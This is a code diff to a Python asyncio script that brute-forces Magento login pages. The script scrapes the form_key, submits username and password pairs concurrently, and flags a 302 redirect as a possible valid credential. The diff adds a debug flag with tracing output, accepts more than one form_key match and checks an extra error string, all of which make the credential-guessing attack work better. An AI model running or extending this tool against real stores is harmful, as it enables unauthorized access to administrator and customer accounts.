@@ -66,6 +66,11 @@ parser.add_argument(
     default=1,
     type=int)
 parser.add_argument(
+    "-d",
+    help="For debugging. Prints out some traces.",
+    action='store_true',
+    default=False)
+parser.add_argument(
     "url",
     help="The url where the Magento login is located")
 
@@ -92,9 +97,13 @@ async def do_request(url, username, password, cookies={}):
     }
     async with aiohttp.ClientSession() as session:
         async with session.get(url, headers=hg, cookies=cookies, allow_redirects=False) as response:
+
+            debug("\rwaiting initial get response", end='\r')
+
             t = await response.text()
 
             if response.status > 299 and response.status < 400:
+                debug(f"\rredirecting from initial get response to {response.headers['Location']}", end='\r')
                 _ = await do_request(response.headers['Location'], username, password, response.cookies)
                 url = response.headers['Location']
                 return
@@ -103,9 +112,11 @@ async def do_request(url, username, password, cookies={}):
                 r'(?=value)value=\"(?P<value>[^\"]+)',
                 t)
 
-            if form_key != None and len(form_key) == 1:
+            if form_key != None and len(form_key) >= 1:
                 form_key = form_key[0]
                 data_str = f"form_key={form_key}&login%5Busername%5D={username}&login%5Bpassword%5D={password}"
+
+                debug(f"\rGot form_key: {form_key} ", end='\r')
 
                 async with session.post(
                     url,
@@ -117,18 +128,30 @@ async def do_request(url, username, password, cookies={}):
                     t = await response2.text()
                     c = response2.status
                     if c == 200:
-                        if "messages-message-error" in t:
+                        if "messages-message-error" in t or "error-msg" in t:
                             print(
                                 f"[X] Bad {username}: {password}               ",
                                 end="\r")
+                        else:
+                            debug(f"Response code: {response2.status}")
+                            debug(f"Response Text: {t}")
                     elif c == 302:
                         print(f"[V] To Check: {username}: {password}")
+                    else:
+                        debug(f"Response code: {response2.status}")
+                        debug(f"Response Text: {t}")
             else:
                 print(f"[!] Missed request => {username}: {password}!")
                 print("\t+ Reduce -m Max concurrent calls parameter or")
                 print("\t+ Increase -t for waiting more seconds")
                 exit(1)
 
+
+debug_enabled = False
+def debug(msg, end=None):
+    global debug_enabled
+    if debug_enabled:
+        print(msg, end=end)
 
 
 async def main(
@@ -180,6 +203,7 @@ if __name__ == "__main__":
         url = args.url
         max_concurrent_calls = args.m
         t = args.t
+        debug_enabled = args.d
         loop = asyncio.get_event_loop()
         loop.run_until_complete(
             main(
